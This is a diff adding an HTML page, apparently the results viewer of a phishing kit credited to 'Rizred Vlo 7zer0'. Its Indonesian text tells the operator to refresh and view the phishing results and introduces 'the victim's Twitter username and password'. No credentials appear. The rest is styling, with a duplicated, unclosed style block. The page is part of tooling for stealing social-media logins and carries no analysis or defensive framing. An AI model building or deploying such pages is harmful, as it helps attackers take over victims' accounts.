@@ -1,1 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  background-image: url("https://1.bp.blogspot.com/-eLTvVd1yQSs/XiFUjvHwyyI/AAAAAAAAAR8/OYWSm4-IpM0MrH_aaTBoe5gKP6eDBoitACLcBGAsYHQ/s1600/20200117_132912.jpg");
+  background-repeat: no-repeat;
+  background-position: right top;
+  margin-right: 200px;
+  background-attachment: fixed;
+  background-size: 100% ;
+  background-position:top center;
+}
+</style>
+</head>
+<body>
+
+<style>body{cursor: url(), progress !important; repeat center;color:lime;} .kotak{text-align:center;background:transparant;border:solid lime
+2px;border-radius:10px;position:fixed;top:2px;left:2px;left:1px;right:1px;}.kotak1{text-align:center;background:transparant;border:solid lime 2px;border-radius:10px;position:fixed;bottom:2px;left:1px;right:1px;}</style><br/><br/>
+
+
+<div class="kotak"><font color="green">••••• Zona Red •••••</font></div><div class="kotak1"><blink>|"Dev By Rizred Vlo 7zer0✬"|</blink></div></center>
+
+
+
+<center>Geser Ke Bawah Untuk Refresh Halaman Dan Lihat Hasil Phising</center><br><br>
 Inilah Username Dan Password Twitter Korban :
+
+<head>
+<style>
+body {margin:0;}
+
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #333;
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+}
+
+li {
+  float: left;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover:not(.active) {
+  background-color: #111;
+}
+
+.active {
+  background-color: #4CAF50;
+}
+</style>
+</head>
+<body>
+
+<head>
+<style>
+body {margin:0;}
+
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #333;
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+}
+
+li {
+  float: left;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover:not(.active) {
+  background-color: #111;
+}
+
+.active {
+  background-color: #4CAF50;
+}
+</style>
+</head>
+<body>
